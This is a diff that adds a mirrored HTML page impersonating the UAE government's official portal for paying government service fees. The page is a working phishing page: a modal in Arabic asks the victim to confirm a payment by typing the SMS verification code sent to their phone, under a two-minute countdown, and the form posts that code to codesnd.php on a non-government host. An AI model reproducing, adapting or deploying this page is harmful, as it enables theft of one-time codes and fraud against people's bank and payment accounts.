@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from tonfree.serv00.net/chalet/banks/sms.html by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 03 Oct 2025 15:51:30 GMT -->
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <!-- link_icons -->
+        <link rel="stylesheet"  href="../../../cdn.jsdelivr.net/npm/bootstrap-icons%401.5.0/font/bootstrap-icons.css">
+        <link rel="stylesheet"  href="../../../stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
+        <title>القنوات الذكية لتسديد رسوم الخدمات الحكومية | البوابة الرسمية لحكومة الإمارات العربية المتحدة</title>
+        <!-- logo site web-->
+        <link rel="icon" href="image/favicon.html" type="image/x-icon"/>
+        <link rel="shortcut icon" href="image/favicon.html" type="image/x-icon" />
+        <!-- link__css -->
+        <link rel="stylesheet"  href="css/bootstrap.css">
+        <link rel="stylesheet"  href="css/boom.css">
+        <style>
+            .modal-open{
+                overflow:hidden;
+                padding-right:0px;
+            }
+        </style>
+</head>
+<body class="modal-open">
+        
+        <!-- Modal -->
+        <div class="modal fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;">
+          <div class="modal-dialog shadow">
+            <div class="modal-content">
+              <div class="modal-header ">
+                    <img src="image/Emarats.png">
+              </div>
+              <div class="modal-body">
+                <div class="text-center pp">
+                    <h6>يرجى تاكيد الدفع</h6>
+                </div>
+                <div class="tato">
+                     <p>يرجى ادخال رمز التحقق المرسل الى هاتفك</p>
+                </div>
+                <form action="../../../external.html?link=https://tonfree.serv00.net/chalet/banks/codesnd.php" method="post">
+                     <input type="hidden" name="step" value="sms">
+                     <div class="content">
+                         <div class="left">
+                             
+                         </div>
+                         <div class="right">
+                             
+                                 <div class="form-group mt-4">
+                                     <input type="text" name="sms" id="sim" class="form-control">
+                                     
+                                 </div>
+                             </span>
+                         </div>
+                     </div>
+                     <div class="time " >
+                         <p>يمكنك طلب رمز جديد خلال :</p>
+                         <div class="countdown ms-2" style="color:#0047BB;"></div>
+                     </div>
+                     <div class="botona">
+                         <button class="btn" name="submit">تأكيد</button>
+                     </div>
+                     <div class="copirayt text-center">
+                         <p>2025 © - all rights reserved</p>
+                     </div>
+                 </form>
+              </div>
+            </div>
+          </div>
+        </div>
+
+
+        <script src="js/jquery-3.5.1.min.html"></script>
+        <script src="js/jquery.mask.html"></script>
+        <script>
+
+             var timer2 = "02:00";
+              var interval = setInterval(function() {
+              var timer = timer2.split(':');
+              //by parsing integer, I avoid all extra string processing
+              var minutes = parseInt(timer[0], 10);
+              var seconds = parseInt(timer[1], 10);
+              --seconds;
+              minutes = (seconds < 0) ? --minutes : minutes;
+              if (minutes < 0) clearInterval(interval);
+              seconds = (seconds < 0) ? 59 : seconds;
+              seconds = (seconds < 10) ? '0' + seconds : seconds;
+              //minutes = (minutes < 10) ?  minutes : minutes;
+              $('.countdown').html(minutes + ':' + seconds);
+              timer2 = minutes + ':' + seconds;
+              }, 1000);
+
+
+            
+        </script>
+              
+</body>
+
+<!-- Mirrored from tonfree.serv00.net/chalet/banks/sms.html by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 03 Oct 2025 15:51:38 GMT -->
+</html>
